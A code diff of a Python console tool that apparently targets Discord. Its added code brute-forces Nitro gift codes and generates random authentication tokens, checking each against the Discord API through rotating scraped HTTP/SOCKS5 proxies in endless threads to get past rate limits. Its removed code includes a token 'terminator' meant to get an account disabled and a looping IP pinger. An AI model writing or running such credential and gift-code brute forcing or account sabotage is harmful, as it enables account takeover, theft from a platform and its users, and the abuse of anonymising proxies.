@@ -1,19 +1,9 @@
-import os
-import random
-import string
-import time
-import ctypes
-import sys
-import requests
-import base64
-import json
+import os, re, random, string, time, sys, base64, httpx
 from colorama import Fore
 from colorama import Style
-from itertools import cycle
 from random import randint
 from lxml.html import fromstring
-import traceback
-import threading
+from threading import Thread
 
 
 def slowprint(s, c, newLine=True):
@@ -41,9 +31,9 @@ def main():
     {Fore.BLUE}                                  ░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝{Fore.RESET}
                ''')
 
-    time.sleep(2)
+    time.sleep(1)
     slowprint(
-        f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}crown{Fore.RESET}', .02)
+        f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}bnt{Fore.RESET}', .02)
     time.sleep(1)
 
     operation = input(f'''
@@ -51,25 +41,19 @@ def main():
 
     {Fore.BLUE}                                                   [1] Nitro Gen and Checker
                                                        [2] Token Gen and Checker
-                                                       [3] Token Terminator
-                                                       [4] Proxy Scraper
-                                                       [5] Proxy Checker
-                                                       [6] Pinger
-                                                       [7] Exit{Fore.RESET}
+                                                       [3] Proxy Scraper
+                                                       [4] HTTP/SOCKS5 Proxy Checker
+                                                       [5] Exit{Fore.RESET}
 >''')
     if str(operation) == "1":
-        generateCheck()
+        nitrogen()
     elif str(operation) == "2":
         tokengen()
     elif str(operation) == "3":
-        terminate()
+        proxyscraper()
     elif str(operation) == "4":
-        proxy()
-    elif str(operation) == "5":
         proxychecker()
-    elif str(operation) == "6":
-        pinger()
-    elif str(operation) == "7":
+    elif str(operation) == "5":
         exit()
     else:
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -78,90 +62,52 @@ def main():
         main()
 
 
-def generateCheck():
+def nitrogen():
     os.system('cls' if os.name == 'nt' else 'clear')
-    while True:
-        code = ''.join(random.choices(
-            string.ascii_uppercase + string.digits + string.ascii_lowercase,
-            k=16
-        ))
+    def check(prxtype,fileproxy):
+        if prxtype == 'HTTP':
+            proxtype = 'http://'
+        elif prxtype == 'SOCKS5':
+            proxtype = 'socks5://'
+        nitro = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(19))
+        try:
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
+            r = httpx.get(url,proxies=proxtype + random.choice(list(map(lambda x:x.strip(),open(fileproxy)))))
+            if r.status_code == 200:
+                with open('Valid Nitro.txt', 'a') as f:
+                    f.write('https://discord.com/gifts/' + nitro + '\n')
+                print(f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | https://discord.com/gifts/{nitro}')
+            else:
+                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | https://discord.com/gifts/{nitro}')
+        except:
+            pass
 
-        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
-        s = requests.session()
-        response = s.get(url)
-
-        nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code
-
-        if 'subscription_plan' in response.text:
-            print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
-            print("FOUND CODE")
-            with open("code.txt", "w") as f:
-                f.write(nitro)
-            break
-
-        else:
-            print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
-            continue
-
-
-def get_proxies():
-    url = 'https://sslproxies.org/'
-    response = requests.get(url)
-    parser = fromstring(response.text)
-    proxies = set()
-    for i in parser.xpath('//tbody/tr')[:10]:
-        if i.xpath('.//td[7][contains(text(),"yes")]'):
-            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
-                             i.xpath('.//td[2]/text()')[0]])
-            proxies.add(proxy)
-    return proxies
-
-
-def terminate():
-    token = input("Enter the token you want to terminate: ")
-    while True:
-        print("Terminating token...")
-        api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
-        data = api.json()
-        check = requests.get(
-            "https://discordapp.com/api/v6/guilds/" +
-            data['guild']['id'],
-            headers={
-                "Authorization": token})
-        stuff = check.json()
-        requests.post(
-            "https://discordapp.com/api/v6/invite/hwcVZQw",
-            headers={
-                "Authorization": token})
-        requests.delete(
-            "https://discordapp.com/api/v6/guiilds" +
-            data['guild']['id'],
-            headers={
-                "Authorization": token})
-
-        if stuff['code'] == 0:
-            print("Successfully disabled!")
-            print("Disabler by NullCode and Giggl3z")
-            time.sleep(2)
-            break
+    def nitros():
+        try:
+            prxtype = input('HTTP/SOCKS5: ')
+        except:
+            print('Invalid')
             main()
+        try:
+            fileproxy = input('Proxy File: ')
+        except:
+            print('Invalid')
+            main()
+        while True:
+            t = Thread(target=check, args=(prxtype,fileproxy),daemon=True)
+            t.start()
+    nitros()
+    main()
+
+
 
 
 def tokengen():
-
-    N = input("How many you want?: ")
-    count = 0
-    current_path = os.path.dirname(os.path.realpath(__file__))
-    url = "https://discordapp.com/api/v6/users/@me/library"
-
-    while(int(count) < int(N)):
-        tokens = []
+    os.system('cls' if os.name == 'nt' else 'clear')
+    def check(prxtype,fileproxy):
         base64_string = "=="
         while(base64_string.find("==") != -1):
-            sample_string = str(
-                randint(
-                    000000000000000000,
-                    999999999999999999))
+            sample_string = str(randint(100000000000000000,999999999999999999))
             sample_string_bytes = sample_string.encode("ascii")
             base64_bytes = base64.b64encode(sample_string_bytes)
             base64_string = base64_bytes.decode("ascii")
@@ -171,153 +117,137 @@ def tokengen():
                 random.choice(
                     string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                 random.choice(
-                    string.ascii_letters + string.digits) for _ in range(27))
-            count += 1
-            tokens.append(token)
-        proxies = get_proxies()
-        proxy_pool = cycle(proxies)
+                    string.ascii_letters + string.digits) for _ in range(38))
+        if prxtype == 'HTTP':
+            proxtype = 'http://'
+        elif prxtype == 'SOCKS5':
+            proxtype = 'socks5://'
 
-        for token in tokens:
-            proxy = next(proxy_pool)
             header = {
                 "Content-Type": "application/json",
                 "authorization": token
             }
-            r = requests.get(url, headers=header, proxies={"http": proxy})
-            if r.status_code == 200:
-                print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
-                with open("workingtokens.txt", "a") as f:
-                    f.write(token + "\n")
+            try:
+                r = httpx.get("https://discordapp.com/api/v6/users/@me/library", headers=header, proxies=proxtype + random.choice(list(map(lambda x:x.strip(),open(fileproxy)))))
+                if r.status_code == 200:
+                    print(f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}')
+                    with open("workingtokens.txt", "a") as f:
+                        f.write(token + "\n")
 
-            elif "rate limited." in r.text:
-                print("[-] You are being rate limited.")
-                main()
+                elif "rate limited." in r.text:
+                    print("[-] You are being rate limited. Will wait 10 seconds!")
+                    time.sleep(10)
 
-            else:
-                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
-        tokens.remove(token)
+                else:
+                    print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
+            except:
+                pass
+    def tokens():
+        try:
+            prxtype = input('HTTP/SOCKS5: ')
+        except:
+            print('Invalid')
+            main()
+        try:
+            fileproxy = input('Proxy File: ')
+        except:
+            print('Invalid')
+            main()
+        while True:
+            t = Thread(target=check, args=(prxtype,fileproxy),daemon=True)
+            t.start()
+    tokens()
+    main()
 
 
-def proxy():
-    os.system('cls')
-
-    url = 'https://api.openproxylist.xyz/http.txt'
-    r = requests.get(url)
-    results = r.text
-    with open("http.txt", "w") as file:
-        file.write(results)
-    print('done http')
-
-    url = 'https://api.openproxylist.xyz/socks4.txt'
-    r = requests.get(url)
-    results = r.text
-    with open("socks4.txt", "w") as file:
-        file.write(results)
-    print('done socks4')
-
-    url = 'https://api.openproxylist.xyz/socks5.txt'
-    r = requests.get(url)
-    results = r.text
-    with open("socks5.txt", "w") as file:
-        file.write(results)
-    print('done socks4')
+def proxyscraper():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    http = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=http&ssl=yes','https://api.proxyscrape.com/?request=displayproxies&proxytype=https&ssl=yes','https://sheesh.rip/new.txt','https://www.proxy-list.download/api/v1/get?type=https','https://www.proxy-list.download/api/v1/get?type=http','https://spys.me/proxy.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/RX4096/proxy-list/main/online/all.txt','https://raw.githubusercontent.com/almroot/proxylist/master/list.txt']
+    s4 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks4','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt']
+    s5 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks5','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt']
+    try:
+        os.remove('http.txt')
+        os.remove('socks4.txt')
+        os.remove('socks5.txt')
+    except:
+        pass
+    for src in http:
+        r = httpx.get(src)
+        with open("http.txt", "a") as file:
+            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
+                proxies = proxy[0] + ':' + proxy[1] + '\n'
+                file.write(proxies)
+    print('HTTP Scraped')
+    for src in s4:
+        r = httpx.get(src)
+        with open("socks4.txt", "a") as file:
+            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
+                proxies = proxy[0] + ':' + proxy[1] + '\n'
+                file.write(proxies)
+    print('SOCKS4 Scraped')
+    for src in s5:
+        r = httpx.get(src)
+        with open("socks5.txt", "a") as file:
+            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
+                proxies = proxy[0] + ':' + proxy[1] + '\n'
+                file.write(proxies)
+    print('SOCKS5 Scraped')
     time.sleep(2)
     main()
 
 
 def proxychecker():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    def check(PROXY,url,prxtype):
+        if prxtype == 'HTTP':
+            proxtype = 'http://'
+        elif prxtype == 'SOCKS5':
+            proxtype = 'socks5://'
 
-
-    r = requests.Session()
-
-    def check(prox):
-	    link = 'http://google.com/'
-	    r.proxies = {
-	    'http':'http://{}'.format(prox),
-	    'https':'http://{}'.format(prox)
-	    }
-	    try:
-		    req = r.get(link,timeout=2)
-		    if req.status_code == 200:
-			    print(Fore.LIGHTGREEN_EX+" Good [{}]".format(prox))
-			    with open('good.txt','a') as wr: #w writes to good.txt in folder
-				    wr.write(prox+'\n')
-		    else:
-				    print(Fore.YELLOW +" Blocked [{}]".format(prox))
-	    except:
-		    print(Fore.LIGHTRED_EX+" Bad [{}]".format(prox))
-    proxies=open('proxies.txt', 'r').read().splitlines() # reads from proxies.txt in folder
-    from multiprocessing.dummy import Pool as ThreadPool
-    pool = ThreadPool(13)
-    results = pool.map(check, proxies)
-main()
-
-def pinger():
-
-    os.system("mode con:cols=61 lines=30")
-    os.system("@title 666 Pinger & cls")
-    print("          66666666           66666666           66666666  ")
-    time.sleep(0.17)
-    os.system("color 01")
-    print("         66666666           66666666           66666666 ")
-    time.sleep(0.17)
-    os.system("color 03")
-    print("        66666666           66666666           66666666 ")
-    time.sleep(0.17)
-    os.system("color 05")
-    print("       66666666           66666666           66666666 ")
-    time.sleep(0.17)
-    os.system("color 07")
-    print("      66666666           66666666           66666666 ")
-    time.sleep(0.17)
-    os.system("color 09")
-    print("     66666666           66666666           66666666 ")
-    time.sleep(0.17)
-    os.system("color 01")
-    print("    66666666           66666666           66666666  ")
-    time.sleep(0.17)
-    os.system("color 03")
-    print("   66666666666666     66666666666666     66666666666666 ")
-    time.sleep(0.17)
-    os.system("color 05")
-    print("  66666666666666666  66666666666666666  66666666666666666")
-    time.sleep(0.17)
-    os.system("color 07")
-    print("  666666666666666666 666666666666666666 666666666666666666 ")
-    time.sleep(0.17)
-    os.system("color 09")
-    print("  6666666     66666666666666     66666666666666     6666666")
-    time.sleep(0.17)
-    os.system("color 01")
-    print("  6666666     66666666666666     66666666666666     6666666")
-    time.sleep(0.17)
-    os.system("color 03")
-    print("  666666666666666666666666666666666666666666666666666666666")
-    time.sleep(0.17)
-    os.system("color 05")
-    print("   66666666666666666  66666666666666666  66666666666666666 ")
-    time.sleep(0.17)
-    os.system("color 07")
-    print("     6666666666666      6666666666666      6666666666666 ")
-    time.sleep(0.17)
-    os.system("color 4F")
-    print("       666666666          666666666          666666666 ")
-
-    ip = str(input("\nEnter IP fam: "))
-
-    while True:
-        if os.system("ping -n 1 " + ip + ">nul") == 0:
-            print(ip + " is alive!")
-            os.system("color " + str(random.randrange(0, 9)))
-        else:
-            print(ip + " Get downed SKID")
-            os.system("color " + str(random.randrange(0, 9)))
-            time.sleep(2)
-            os.system("mode con:cols=120lines=20")
+        with httpx.Client(http2=True,headers = {'user-agent':'ProxyCheck[Crown]'},follow_redirects=True,proxies=proxtype + PROXY) as client:
+            try:
+                    req = client.get(url)
+                    if req.status_code <= 300 and 'Google' in str(req.content):
+                        print (Fore.GREEN + '[Valid] ' + PROXY + ' ' + str(req.status_code))
+                        with open(f'{prxtype}_good.txt', 'a') as xX:
+                            xX.write(PROXY + '\n')
+                    elif req.status_code >= 300:
+                        print (Fore.YELLOW + '[Blocked] ' + PROXY + ' ' + str(req.status_code))
+                    else:
+                        print(Fore.RED + '[Bad] ' + PROXY + ' ' + str(req.status_code))
+            except httpx.HTTPError as exc:
+                pass
+            except:
+                pass
+    def proxer():
+        try:
+            prxtype = input('HTTP/SOCKS5: ')
+        except:
+            print('Invalid')
             main()
-
+        try:
+            fileproxy = input('Proxy File: ')
+        except:
+            print('Invalid')
+            main()
+        domain = 'https://www.google.com/'
+        os.system('cls' if os.name == 'nt' else 'clear')
+        with open(fileproxy, 'r') as x:
+            prox = x.read().splitlines()
+        Threads = []
+        for proxy in prox:
+            t = Thread(target=check, args=(proxy,domain,prxtype),daemon=True)
+            t.start()
+            Threads.append(t)
+        for i in Threads:
+            i.join()
+        print('Done!')
+        time.sleep(5)
+    proxer()
+    main()
 
 def exit():
+    os.system('cls' if os.name == 'nt' else 'clear')
     slowprint('bye bye darlin', .02)
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
